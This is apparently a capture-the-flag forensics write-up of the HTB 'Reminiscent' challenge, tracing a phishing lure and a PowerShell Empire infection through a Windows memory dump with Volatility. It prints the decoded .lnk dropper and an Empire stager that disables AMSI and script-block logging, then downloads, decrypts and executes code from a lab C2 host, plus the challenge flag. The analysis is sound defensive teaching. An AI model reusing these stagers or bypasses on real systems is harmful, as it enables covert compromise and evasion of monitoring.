---
layout: post
title: "Reminiscent (HTB forensics)"
subtitle: "a phishing .eml, a resume.pdf.lnk Empire launcher, and the flag sitting in a PowerShell stager in the memory image"
date: 2023-04-12
tags: [htb, forensics, volatility, memory-forensics, powershell-empire, phishing]
category: writeups
kind: challenge
os: Windows
tldr: "The challenge gave me a phishing email and a Windows memory dump. The mail lured the victim to resume.zip, which carried resume.pdf.lnk, a PowerShell Empire launcher. I identified the Win7 SP1 x64 image in Volatility, walked the process tree to two PowerShell processes spawned from Explorer, and decoded their command lines. The first reads a payload out of the .lnk, the second is an Empire HTTP stager whose command line sets the flag inline."
---
{% raw %}

## the mail

The challenge handed me two files: a phishing email `Resume.eml` and a VirtualBox memory dump `flounder-pc-memdump.elf`. The mail is the setup.

```text
From: Brian Loodworm <bloodworm@madlab.lcl>
To: flounder@madlab.lcl
Subject: Resume
Organization: HackTheBox
Delivered-To: madlab.lcl-flounder@madlab.lcl
Received: from mail.madlab.lcl (HELO mail.madlab.lcl) (127.0.0.1)
 by mail.madlab.lcl (qpsmtpd/0.96) with ESMTPSA ...; Mon, 02 Oct 2017 22:30:24 -0400
```

It was sent internally (the `Received` line shows `127.0.0.1` through qpsmtpd), from `bloodworm@madlab.lcl` to `flounder@madlab.lcl`. The plain-text part is a short resume-review pretext with a link:

```text
Hi Frank, someone told me you would be great to review my resume..
Could you have a look?

resume.zip [1]

Links:
------
[1] http://10.10.99.55:8080/resume.zip
```

So the lure is `resume.zip` served from `10.10.99.55:8080`. The display name in the `From` header is Brian Loodworm, not "Brain" as I had scribbled in my notes. Nothing in the mail itself is malicious, it just points the victim at the archive. Everything that matters happened after the download, which is why the memory image is the real target.

## the memory image

The image ships with an `imageinfo.txt`, so the profile was already identified:

```text
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, ...
 Number of Processors : 2
 Image date and time : 2017-10-04 18:07:30 UTC+0000
```

Windows 7 SP1 x64, captured on 2017-10-04. I worked the rest with Volatility 3, and `windows.info` confirmed the same build:

```bash
$ vol -f flounder-pc-memdump.elf windows.info
```

```text
Kernel Base   0xf8000260e000
Is64Bit       True
NTBuildLab    7601.18741.amd64fre.win7sp1_gdr.
SystemTime    2017-10-04 18:07:30+00:00
NtSystemRoot  C:\Windows
```

Then the process tree, which is where the chain shows up:

```bash
$ vol -f flounder-pc-memdump.elf windows.pstree
```

```text
PID   PPID  ImageFileName   CreateTime                   Cmd
2044  2012  explorer.exe    2017-10-04 18:04:41 UTC      C:\Windows\Explorer.EXE
* 496   2044  powershell.exe 2017-10-04 18:06:58 UTC     "...powershell.exe" -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UC...'))...
** 2752  496  powershell.exe 2017-10-04 18:07:00 UTC     "...powershell.exe" -noP -sta -w 1 -enc JABHAHIAbwBV...
* 2812  2044  thunderbird.ex 2017-10-04 18:06:24 UTC     "...\thunderbird.exe"
```

The PPID column tells the story. `powershell.exe` (496) and `thunderbird.exe` (2812) are both children of `explorer.exe` (2044), so they are siblings, not parent and child. Thunderbird was open when the lure arrived (created 18:06:24), and the first PowerShell fired half a minute later (18:06:58) as a direct child of Explorer, which is what a shortcut double-clicked from a folder looks like. A quick `strings` pass over the dump lines up with that:

```bash
$ strings flounder-pc-memdump.elf | grep -i resume
```

```text
Visited: user@file:///C:/Users/user/Desktop/resume.zip
C:\Users\user\Desktop\resume\resume.pdf.lnk
```

`resume.zip` was saved to the Desktop and extracted to `C:\Users\user\Desktop\resume\`, and the thing that ran was `resume.pdf.lnk`. The two PowerShell command lines are the whole payload, both preserved in memory long after the processes would have been cleaned up on disk.

## the dropper

The first PowerShell (PID 496) ran hidden and base64-decodes an ASCII blob before executing it. Decoding that blob:

```bash
$ echo 'JHN0UC...' | base64 -d
```

```text
$stP,$siP=3230,9676;$f='resume.pdf.lnk';
if(-not(Test-Path $f)){$x=Get-ChildItem -Path $env:temp -Filter $f -Recurse;
  [IO.Directory]::SetCurrentDirectory($x.DirectoryName);}
$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$b64=New-Object byte[]($siP);
$lnk.Seek($stP,[IO.SeekOrigin]::Begin);
$lnk.Read($b64,0,$siP);
$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);
$scB=[Text.Encoding]::Unicode.GetString($b64);
iex $scB;
```

This is the launcher carried inside `resume.pdf.lnk`. It opens the shortcut as a file, seeks to offset `3230`, reads `9676` bytes, base64-decodes them into a UTF-16 string, and runs the result with `iex`. The real payload is appended to the shortcut and the shortcut reads it back out of itself, which is the standard Empire `.lnk` stager shape. I never had the `.lnk` on disk, so the offset and length are all I can state about it. The bytes it read are not something I recovered from the file, but the thing they decode to ran as its own process, and that process is the second PowerShell.

## the stager

The second PowerShell (PID 2752) used `-enc`, which takes base64 of a UTF-16LE string, so the decode needs the extra `iconv` step:

```bash
$ echo 'JABHAHIAbwBV...' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

```text
$GroUPPOLiCYSEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"(
  'cachedGroupPolicySettings','NonPublic,Static').GETValUe($nulL);
$GRouPPOlICySeTTiNgS['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
$GRouPPOLICYSEtTingS['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{
  $_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};
$WC=NEW-OBjEcT SysTEM.NEt.WeBClIEnt;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDerS.Add('User-Agent',$u);
$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');
$R={$D,$K=$ArgS; ... RC4 ... };
$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");
$ser='http://10.10.99.55:80';$t='/login/process.php';
$flag='HTB{$_j0G_y0uR_M3m0rY_$}';
$DatA=$WC.DoWNLoaDDATA($SeR+$t);$iv=$daTA[0..3];$DAta=$Data[4..$DAta.LenGTH];
-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX
```

This is a textbook PowerShell Empire HTTP stager. Read top down, it:

- zeroes `EnableScriptBlockLogging` and `EnableScriptBlockInvocationLogging` in the cached group-policy settings so the payload is not logged,
- flips `amsiInitFailed` to `$True` to disable AMSI for the process,
- builds a `WebClient` with a spoofed IE user-agent and the default proxy credentials,
- defines an RC4 routine `$R` keyed on the 32-byte staging key `E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw`,
- downloads the next stage from `http://10.10.99.55:80/login/process.php`, strips a 4-byte IV off the front, RC4-decrypts the rest, and `iex`es it.

Note the port split: the zip lure was `:8080`, the C2 callback is `:80`, both on `10.10.99.55`. I did not fetch `/login/process.php` or run the RC4 decrypt, so the staging key and the `session` cookie are values I read out of the command line, not things I exercised. I did not need to. This challenge's author left the flag sitting in the clear as the `$flag` variable in the stager itself.

## the flag

The flag is the `$flag` assignment in the decoded stager, read straight out of PID 2752's command line in the memory image:

```text
HTB{$_j0G_y0uR_M3m0rY_$}
```

"Jog your memory," which is the whole point of the challenge. The chain is a resume lure in a phishing mail, a `.lnk` that reads a PowerShell payload out of its own tail, and an Empire stager that tried to blind AMSI and script-block logging on the way in. None of that hid it from the memory image, which kept both command lines verbatim well after the processes were gone.
{% endraw %}